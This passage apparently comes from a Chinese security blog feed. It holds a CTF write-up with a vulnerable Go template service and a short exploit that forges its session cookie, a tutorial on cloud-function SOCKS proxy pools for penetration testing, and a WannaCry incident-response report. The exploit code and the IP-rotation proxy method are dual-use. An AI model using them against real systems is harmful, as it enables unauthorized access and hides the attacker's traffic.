class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs go\"><span class=\"hljs-keyword\">package</span> main<br><br><span class=\"hljs-keyword\">import</span> (<br>\t_ <span class=\"hljs-string\">&quot;embed&quot;</span><br>\t<span class=\"hljs-string\">&quot;fmt&quot;</span><br>\t<span class=\"hljs-string\">&quot;os&quot;</span><br>\t<span class=\"hljs-string\">&quot;reflect&quot;</span><br>\t<span class=\"hljs-string\">&quot;strings&quot;</span><br>\t<span class=\"hljs-string\">&quot;text/template&quot;</span><br><br>\t<span class=\"hljs-string\">&quot;github.com/gin-contrib/sessions&quot;</span><br>\t<span class=\"hljs-string\">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br>\t<span class=\"hljs-string\">&quot;github.com/gin-gonic/gin&quot;</span><br>\t<span class=\"hljs-string\">&quot;github.com/maja42/goval&quot;</span><br>)<br><br><span class=\"hljs-comment\">//go:embed template/index.html</span><br><span class=\"hljs-keyword\">var</span> tpl <span class=\"hljs-keyword\">string</span><br><br><span class=\"hljs-comment\">//go:embed main.go</span><br><span class=\"hljs-keyword\">var</span> source <span class=\"hljs-keyword\">string</span><br><br><span class=\"hljs-keyword\">type</span> Eval <span class=\"hljs-keyword\">struct</span> &#123;<br>\tE <span class=\"hljs-keyword\">string</span> <span class=\"hljs-string\">`json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;`</span><br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-params\">(e Eval)</span> <span class=\"hljs-title\">Result</span><span class=\"hljs-params\">()</span> <span class=\"hljs-params\">(<span class=\"hljs-keyword\">string</span>, error)</span></span> &#123;<br>\teval := goval.NewEvaluator()<br>\tresult, err := eval.Evaluate(e.E, <span class=\"hljs-literal\">nil</span>, <span class=\"hljs-literal\">nil</span>)<br>\t<span class=\"hljs-keyword\">if</span> err != <span class=\"hljs-literal\">nil</span> &#123;<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;&quot;</span>, err<br>\t&#125;<br>\tt := reflect.ValueOf(result).Type().Kind()<br><br>\t<span class=\"hljs-keyword\">if</span> t == reflect.Int &#123;<br>\t\t<span class=\"hljs-keyword\">return</span> fmt.Sprintf(<span class=\"hljs-string\">&quot;%d&quot;</span>, result.(<span class=\"hljs-keyword\">int</span>)), <span class=\"hljs-literal\">nil</span><br>\t&#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> t == reflect.String &#123;<br>\t\t<span class=\"hljs-keyword\">return</span> result.(<span class=\"hljs-keyword\">string</span>), <span class=\"hljs-literal\">nil</span><br>\t&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;&quot;</span>, fmt.Errorf(<span class=\"hljs-string\">&quot;not valid type&quot;</span>)<br>\t&#125;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-params\">(e Eval)</span> <span class=\"hljs-title\">String</span><span class=\"hljs-params\">()</span> <span class=\"hljs-title\">string</span></span> &#123;<br>\tres, err := e.Result()<br>\t<span class=\"hljs-keyword\">if</span> err != <span class=\"hljs-literal\">nil</span> &#123;<br>\t\tfmt.Println(err)<br>\t\tres = <span class=\"hljs-string\">&quot;invalid&quot;</span><br>\t&#125;<br>\t<span class=\"hljs-keyword\">return</span> fmt.Sprintf(<span class=\"hljs-string\">&quot;%s = %s&quot;</span>, e.E, res)<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">render</span><span class=\"hljs-params\">(c *gin.Context)</span></span> &#123;<br>\tsession := sessions.Default(c)<br><br>\t<span class=\"hljs-keyword\">var</span> his <span class=\"hljs-keyword\">string</span><br><br>\t<span class=\"hljs-keyword\">if</span> session.Get(<span class=\"hljs-string\">&quot;history&quot;</span>) == <span class=\"hljs-literal\">nil</span> &#123;<br>\t\this = <span class=\"hljs-string\">&quot;&quot;</span><br>\t&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t\this = session.Get(<span class=\"hljs-string\">&quot;history&quot;</span>).(<span class=\"hljs-keyword\">string</span>)<br>\t&#125;<br><br>\tfmt.Println(strings.ReplaceAll(tpl, <span class=\"hljs-string\">&quot;&#123;&#123;result&#125;&#125;&quot;</span>, his))<br>\tt, err := template.New(<span class=\"hljs-string\">&quot;index&quot;</span>).Parse(strings.ReplaceAll(tpl, <span class=\"hljs-string\">&quot;&#123;&#123;result&#125;&#125;&quot;</span>, his))<br>\t<span class=\"hljs-keyword\">if</span> err != <span class=\"hljs-literal\">nil</span> &#123;<br>\t\tfmt.Println(err)<br>\t\tc.String(<span class=\"hljs-number\">500</span>, <span class=\"hljs-string\">&quot;internal error&quot;</span>)<br>\t\t<span class=\"hljs-keyword\">return</span><br>\t&#125;<br>\t<span class=\"hljs-keyword\">if</span> err := t.Execute(c.Writer, <span class=\"hljs-keyword\">map</span>[<span class=\"hljs-keyword\">string</span>]<span class=\"hljs-keyword\">string</span>&#123;<br>\t\t<span class=\"hljs-string\">&quot;s0uR3e&quot;</span>: source,<br>\t&#125;); err != <span class=\"hljs-literal\">nil</span> &#123;<br>\t\tfmt.Println(err)<br>\t&#125;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span></span> &#123;<br>\tport := os.Getenv(<span class=\"hljs-string\">&quot;PORT&quot;</span>)<br>\t<span class=\"hljs-keyword\">if</span> port == <span class=\"hljs-string\">&quot;&quot;</span> &#123;<br>\t\tport = <span class=\"hljs-string\">&quot;8080&quot;</span><br>\t&#125;<br><br>\tr := gin.Default()<br>\tstore := cookie.NewStore([]<span class=\"hljs-keyword\">byte</span>(<span class=\"hljs-string\">&quot;woW_you-g0t_sourcE_co6e&quot;</span>))<br>\tr.Use(sessions.Sessions(<span class=\"hljs-string\">&quot;session&quot;</span>, store))<br><br>\tr.GET(<span class=\"hljs-string\">&quot;/&quot;</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span><span class=\"hljs-params\">(c *gin.Context)</span></span> &#123;<br>\t\trender(c)<br>\t&#125;)<br><br>\tr.GET(<span class=\"hljs-string\">&quot;/flag&quot;</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span><span class=\"hljs-params\">(c *gin.Context)</span></span> &#123;<br>\t\tsession := sessions.Default(c)<br>\t\tsession.Set(<span class=\"hljs-string\">&quot;FLAG&quot;</span>, os.Getenv(<span class=\"hljs-string\">&quot;FLAG&quot;</span>))<br>\t\tsession.Save()<br>\t\tc.String(<span class=\"hljs-number\">200</span>, <span class=\"hljs-string\">&quot;flag is in your session&quot;</span>)<br>\t&#125;)<br><br>\tr.POST(<span class=\"hljs-string\">&quot;/&quot;</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span><span class=\"hljs-params\">(c *gin.Context)</span></span> &#123;<br>\t\tsession := sessions.Default(c)<br><br>\t\t<span class=\"hljs-keyword\">var</span> his <span class=\"hljs-keyword\">string</span><br><br>\t\t<span class=\"hljs-keyword\">if</span> session.Get(<span class=\"hljs-string\">&quot;history&quot;</span>) == <span class=\"hljs-literal\">nil</span> &#123;<br>\t\t\this = <span class=\"hljs-string\">&quot;&quot;</span><br>\t\t&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t\t\this = session.Get(<span class=\"hljs-string\">&quot;history&quot;</span>).(<span class=\"hljs-keyword\">string</span>)<br>\t\t&#125;<br><br>\t\teval := Eval&#123;&#125;<br>\t\t<span class=\"hljs-keyword\">if</span> err := c.ShouldBind(&amp;eval); err == <span class=\"hljs-literal\">nil</span> &#123;<br>\t\t\this = his + eval.String() + <span class=\"hljs-string\">&quot;&lt;br/&gt;&quot;</span><br>\t\t&#125;<br>\t\tsession.Set(<span class=\"hljs-string\">&quot;history&quot;</span>, his)<br>\t\tsession.Save()<br>\t\trender(c)<br>\t&#125;)<br><br>\tr.Run(fmt.Sprintf(<span class=\"hljs-string\">&quot;:%s&quot;</span>, port))<br>&#125;<br></code></pre></td></tr></table></figure>\n<p>exp</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">package <span class=\"hljs-selector-tag\">main</span><br><br>import (<br>\t_ <span class=\"hljs-string\">&quot;embed&quot;</span><br>\t<span class=\"hljs-string\">&quot;fmt&quot;</span><br>\t<span class=\"hljs-string\">&quot;os&quot;</span><br><br>\t<span class=\"hljs-string\">&quot;github.com/gin-contrib/sessions&quot;</span><br>\t<span class=\"hljs-string\">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br>\t<span class=\"hljs-string\">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br>func <span class=\"hljs-selector-tag\">main</span>() &#123;<br>\tport := os<span class=\"hljs-selector-class\">.Getenv</span>(<span class=\"hljs-string\">&quot;PORT&quot;</span>)<br>\t<span class=\"hljs-keyword\">if</span> port == <span class=\"hljs-string\">&quot;&quot;</span> &#123;<br>\t\tport = <span class=\"hljs-string\">&quot;8888&quot;</span><br>\t&#125;<br>\tr := gin<span class=\"hljs-selector-class\">.Default</span>()<br>\tstore := cookie<span class=\"hljs-selector-class\">.NewStore</span>(<span class=\"hljs-selector-attr\">[]</span>byte(<span class=\"hljs-string\">&quot;woW_you-g0t_sourcE_co6e&quot;</span>))<br>\tr<span class=\"hljs-selector-class\">.Use</span>(sessions<span class=\"hljs-selector-class\">.Sessions</span>(<span class=\"hljs-string\">&quot;session&quot;</span>, store))<br>\tr<span class=\"hljs-selector-class\">.GET</span>(<span class=\"hljs-string\">&quot;/flag&quot;</span>, func(c *gin.Context) &#123;<br>\t\tsession := sessions<span class=\"hljs-selector-class\">.Default</span>(c)<br>\t\tc<span class=\"hljs-selector-class\">.String</span>(<span class=\"hljs-number\">200</span>, session<span class=\"hljs-selector-class\">.Get</span>(<span class=\"hljs-string\">&quot;FLAG&quot;</span>).(string))<br>\t&#125;)<br>\tr<span class=\"hljs-selector-class\">.Run</span>(fmt<span class=\"hljs-selector-class\">.Sprintf</span>(<span class=\"hljs-string\">&quot;:%s&quot;</span>, port))<br>&#125;<br></code></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2022/01/04/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/",
            "url": "http://blog.m1n.me/2022/01/04/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/",
            "title": "利用云函数搭建socks5代理",
            "date_published": "2022-01-04T08:29:12.000Z",
            "content_html": "<p>记录一下如何用云函数搭建 socks 代理池，用于 hw 或渗透测试</p>\n<span id=\"more\"></span>\n<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h2>\n<ol>\n<li>\n<p>可以搭建 http、https、socks 代理，这里选择 socks 代理比较方便，适用更多协议，也不需要配置证书即可适配 https</p>\n</li>\n<li>\n<p>因为云函数最长超时时间为 15 分钟，所以 socks 连接最长持续 15 分钟，超时需重连</p>\n</li>\n<li>\n<p>每个月都有免费额度，用完可以换个账户或者可以买云函数包，也不贵</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041635877.png\" alt=\"image-20211220210818106\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h2 id=\"准备\"><a class=\"markdownIt-Anchor\" href=\"#准备\">#</a> 准备</h2>\n<ol>\n<li>某云账户</li>\n<li>一台 VPS，必须 Linux，这里用的是 Ubuntu20.04</li>\n<li><a href=\"https://github.com/shimmeris/SCFProxy\">https://github.com/shimmeris/SCFProxy</a></li>\n</ol>\n<h2 id=\"配置某云函数\"><a class=\"markdownIt-Anchor\" href=\"#配置某云函数\">#</a> 配置某云函数</h2>\n<ol>\n<li>\n<p>云函数地址 https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default，第一次使用需要授权</p>\n</li>\n<li>\n<p>选择自定义创建、事件函数、代码部署、python3.6</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041637887.png\" alt=\"image-20211220211419782\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>先下载项目，把 / SCFProxy/SOCKS5/src/server.py 复制过来，IP 填 VPS 的 IP，端口自选 (记得开放，可以先 nc 监听一下是否能通)</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041637541.png\" alt=\"image-20211220211629211\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>高级配置，超时时间填最大</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638497.png\" alt=\"image-20211220211901488\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>记得选公网访问（默认），别选固定出口 IP</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638342.png\" alt=\"image-20211220211947391\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>配置好触发器选择 API 网关触发</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638687.png\" alt=\"image-20211220212201492\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>复制好触发器的访问路径</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638410.png\" alt=\"image-20211220212336201\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h2 id=\"配置vps\"><a class=\"markdownIt-Anchor\" href=\"#配置vps\">#</a> 配置 VPS</h2>\n<ol>\n<li>环境需要 python3.8 及以上，版本过低需要升级，Ubuntu18.04 可以参考 (<a href=\"https://app.yinxiang.com/fx/94afdeae-41b2-4854-8762-dc08f9b1feb3\">https://app.yinxiang.com/fx/94afdeae-41b2-4854-8762-dc08f9b1feb3</a>)</li>\n<li><code>git clone https://github.com/shimmeris/SCFProxy.git</code></li>\n<li><code>cd ./SCFProxy/SOCKS5</code></li>\n<li><code>pip3 install -r requirements.txt</code></li>\n<li><code>cd ./src/socks_client</code></li>\n<li>VPS 上运行 <code>python3 socks5.py -u &quot;触发器URL&quot; -bp 4455 -sp 4466 --user m1n --passwd m1n</code>  注意这里的 4455 是云函数代码里配置的那个端口，4466 是接下来配置 socks 代理的端口</li>\n</ol>\n<h2 id=\"起飞~\"><a class=\"markdownIt-Anchor\" href=\"#起飞~\">#</a> 起飞～</h2>\n<p>因为浏览器貌似不支持 socks 的账号认证，这边让 burp 走 socks 代理，浏览器走 burp 代理</p>\n<ol>\n<li>\n<p>配置 burp，在 user options 处配置</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638149.png\" alt=\"image-20211220215822772\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>浏览器正常走 burp 代理即可，可以看到 IP 已经是经过代理的 IP</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638948.png\" alt=\"image-20211220215931018\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h2 id=\"倒霉的踩坑记录院长\"><a class=\"markdownIt-Anchor\" href=\"#倒霉的踩坑记录院长\">#</a> 倒霉的踩坑记录 (@院长)</h2>\n<h3 id=\"ubuntupython369\"><a class=\"markdownIt-Anchor\" href=\"#ubuntupython369\">#</a> ubuntu+python3.6.9</h3>\n<p>这是腾讯云 ubuntu 默认环境，自带 python3.6.9 环境，且于操作系统绑定，系统依赖于 python3.6.9，最开始用的 3.6.9 版本的 python 安装工具，一直到安装依赖的时候发现报错，找不到对应的版本  <code>pip3 install -r requirements.txt</code>  这一步报错，报错截图当时没有存。</p>\n<h3 id=\"ubuntupython381\"><a class=\"markdownIt-Anchor\" href=\"#ubuntupython381\">#</a> ubuntu+python3.8.1</h3>\n<p>这里发现问题后就去装了新版的 python，装了 3.8.1，原工具说明里明确说了要 3.8 及以上版本的 python3，新装的 python 环境变量设为了 python3, 这时米有卸载原先自带的 3.6.9，在保留旧版本的基础上将 python3 的优先级指向了 3.8.1，这一步设置未存记录，可自行百度，不复杂，就写下配置文件即可，但是到了安装依赖这一步还是一样的报错，这里和先前的报错一模一样，一开始怀疑是 pip3 的环境变量没有设，但是测试之后发现 pip3 也是新的</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638871.png\" alt=\"image-20220104163441257\" class=\"lazyload\"></p>\n<p>卸了 3.8.1 重装了一次，还是不行，于是气急败坏把旧版本的 3.6.9 卸载了，卸载之后又装了一次依赖，依然不行，这时候然后搞笑的事情就来了，apt-get 用不了了，还有一些其他命令都无法使用，一用就报错，好家伙，系统崩了（截图没存），没有办法，只能重置 vps，因为这台 vps 本来就没怎么装东西，所以还好，损失不大。</p>\n<h3 id=\"ubantu-python381环境变量python38\"><a class=\"markdownIt-Anchor\" href=\"#ubantu-python381环境变量python38\">#</a> ubantu + python3.8.1 (环境变量 python3.8)</h3>\n<p>这里重置了 vps 之后，因为之前的环境是直接通过 apt-get 直接安装的 3.8.1，在装依赖的时候报错内容和 3.6.9 一模一样，怀疑环境变量冲突问题，于是转变思维，单独给 3.8.1 开一个环境变量，并且不通过 apt 安装，apt 安装会自动覆盖环境，所以这里选择了用源码编译的方法安装，具体可以百度，我这里安装完之后 python3.8.1 的环境变量是 python3.8，pip 也是 pip3.8，在这次安装依赖的时候终于一路顺风安装完，没有报错，然后在运行工具的时候报错了，最后查明是工具的命令参数写错了，这个由于当时找的教程最后运行部分的参数是错的导致我在这一步卡了很久，最后请教了同事解决的。</p>\n<h3 id=\"综上所述\"><a class=\"markdownIt-Anchor\" href=\"#综上所述\">#</a> 综上所述</h3>\n<p>这次也是吃到了 apt 的亏吧，平常用 apt 安装软件都习惯了，但是对于环境这类的东西非必要的情况下还是直接用源码编译的方式会好些，像 python 有多版本共存的需求的情况时，就可以用源码编译的方式。这里时 ubuntu 有 python 依赖，所以不能卸载 3.6.9，这也是学到了。在排查的过程中了解到同事用的 centos，于是自己在虚拟机里也试了 centos，过程很流畅，也许是没有自带 python 环境的原因，没有细察。</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2022/01/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "url": "http://blog.m1n.me/2022/01/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "title": "记一次简单的蠕虫病毒事件应急响应",
            "date_published": "2022-01-04T08:16:05.000Z",
            "content_html": "<h2 id=\"背景描述\"><a class=\"markdownIt-Anchor\" href=\"#背景描述\">#</a> 背景描述</h2>\n<p>某日接到某省政务外网安全监管平台通报，某单位的一个 IP 发生 Parite 蠕虫病毒活动事件，其对政务外网内其他地市主机发起 SMB 扫描攻击。</p>\n<span id=\"more\"></span>\n<h2 id=\"事件分析处置\"><a class=\"markdownIt-Anchor\" href=\"#事件分析处置\">#</a> 事件分析处置</h2>\n<ol>\n<li>\n<p>与客户沟通，被通报的 IP 为政务网的出口 IP，不属于某一台服务器</p>\n</li>\n<li>\n<p>网络环境中具有上网行为管理系统，通过排查筛选，定位到一共有四台主机向其他主机的 445 端口发送大量请求</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620353.png\" alt=\"image-20211116165756380\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>与客户沟通了解到对应的四台主机为个人 PC，不是服务器，远程登录到其中的一台主机上</p>\n</li>\n<li>\n<p>上机发现客户对接人员很贴心的帮我们用杀毒软件进行了排查</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620817.png\" alt=\"image-20211116165949834\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>可以看到排查到的风险文件为 C:\\Windows\\svchost.exe，参考文章 https://xz.aliyun.com/t/8095#toc-4 可以知道，通常在攻击者使用创建服务来实现权限维持的时候，可以把恶意进程隐藏在 svchost 进程中。</p>\n</li>\n<li>\n<p>通过工具检查端口使用情况，发现进程 ID 为 2824 的程序向外部主机 445 端口发起大量 TCP 请求</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620314.png\" alt=\"image-20211116170723354\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>通过任务管理器查找对于的进程，发现其服务名为 mssecsvc2.0</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620578.png\" alt=\"image-20211116171005724\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>定位到恶意文件为 C:\\Windows\\mssecsvc.exe 文件</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620248.png\" alt=\"image-20211116171100384\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620281.png\" alt=\"image-20211116171221677\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>通过搜索引擎收集此恶意文件的相关信息，得到其相关描述：</p>\n<p>mssecsvc.exe 文件为通过利用永恒之蓝漏洞的勒索病毒，原病毒文件 mssecsvc.exe 会释放并执行 tasksche.exe 文件，然后检查 kill switch 域名。之后它会创建 mssecsvc2.0 服务。该服务会使用与初次执行不同的入口点执行 mssecsvc.exe 文件。第二次执行会检查被感染电脑的 IP 地址，并尝试联接到相同子网内每个 IP 地址的 TCP 445 端口。当恶意软件成功攻击并联接到一台电脑时，将会建立联接并传输数据，不断进行扩散攻击。</p>\n</li>\n<li>\n<p>通过排查发现 C:\\Windows 目录下的确存在 tasksche.exe 文件</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620466.png\" alt=\"image-20211116172028785\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>通过排查如系统账号、启动项、计划任务、服务等攻击者常用于权限维持手段的敏感配置，发现 mssecsvc.exe 运行于 svchost.exe 进程下，这与步骤 4 中的杀毒软件排查相互印证，而运行于 svchost.exe 的行为常见于攻击者通过注册系统服务来实现自启动恶意文件的目的</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620529.png\" alt=\"image-20211116172256162\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>排查系统的自启动服务项，发现确实存在自启动 mssecsvc2.0 服务的服务项</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620000.png\" alt=\"image-20211116172406701\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>结合搜索引擎中关于 mssecsvc.exe 病毒的描述是通过永恒之蓝漏洞进行传播，利用 360NSA 武器库免疫工具对主机是否存在永恒之蓝漏洞进行排查，发现系统存在多个包括永恒之蓝在内的主机漏洞</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620955.png\" alt=\"image-20211116172422895\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>排查主机端口开启状态，发现该主机的 445 端口对外开放</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621402.png\" alt=\"image-20211116172445687\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>通过对主机上的病毒样本进行采样，上传至分析系统进行检测，其主要的恶意行为如下：</p>\n<p>（1）通过创建服务实现自启动，这与步骤 7、8 所排查到的行为相互印证</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621665.png\" alt=\"image-20211116172532390\" class=\"lazyload\"></p>\n<p>（2）<a href=\"http://xn--www-633e.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\">向 www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</a>、104.17.244.81 发送请求</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621059.png\" alt=\"image-20211116172614229\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621514.png\" alt=\"image-20211116172619205\" class=\"lazyload\"></p>\n<p>通过威胁情报可以确定对应 IP、域名为常见勒索病毒对应的恶意域名</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621899.png\" alt=\"image-20211116172640677\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041700279.png\" alt=\"image-20211116172648753\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>继续对剩余的三台主机进行排查，发现大致情况都一致</p>\n</li>\n</ol>\n<h2 id=\"排查结论\"><a class=\"markdownIt-Anchor\" href=\"#排查结论\">#</a> 排查结论</h2>\n<p>经过详细检测分析，判断该单位出口 IP 为 xxx.xxx.xxx.xxx 的内网网段中，有四台主机感染了 Wannacry 系列勒索病毒家族的蠕虫病毒。</p>\n<p>此病毒通过利用永恒之蓝漏洞进行感染传播，当某台主机存在永恒之蓝漏洞被攻击感染上病毒后，将变成新的攻击机，对内外网中的其他主机进行攻击达到扩散传播的目的。此行为被政务外网安全监管平台捕获，触发报警。</p>\n<h2 id=\"修复建议\"><a class=\"markdownIt-Anchor\" href=\"#修复建议\">#</a> 修复建议</h2>\n<p>1、 通过安装系统补丁（补丁地址见第 7 点），或 360NSA 武器免疫工具（下载地址：<a href=\"http://dl.360safe.com/nsa/nsatool.exe%EF%BC%89%E4%BF%AE%E5%A4%8D%E2%80%9C%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E2%80%9D%E6%BC%8F%E6%B4%9E%E3%80%82\">http://dl.360safe.com/nsa/nsatool.exe）修复 “永恒之蓝” 漏洞。</a></p>\n<p>2、 添加入站规则，建议关闭除业务外不必要的端口 445、135、137、138、139 端口</p>\n<p>3、 断网并对系统全部磁盘进行病毒木马扫描，以清除蠕虫病毒，并观察一段时间，若又发现蠕虫病毒需保存备份重要文件并重装系统。</p>\n<p>4、 开启服务的日志记录功能，及时安装并更新相关补丁。</p>\n<p>5、 对主机系统安装杀毒软件。</p>\n<p>6、 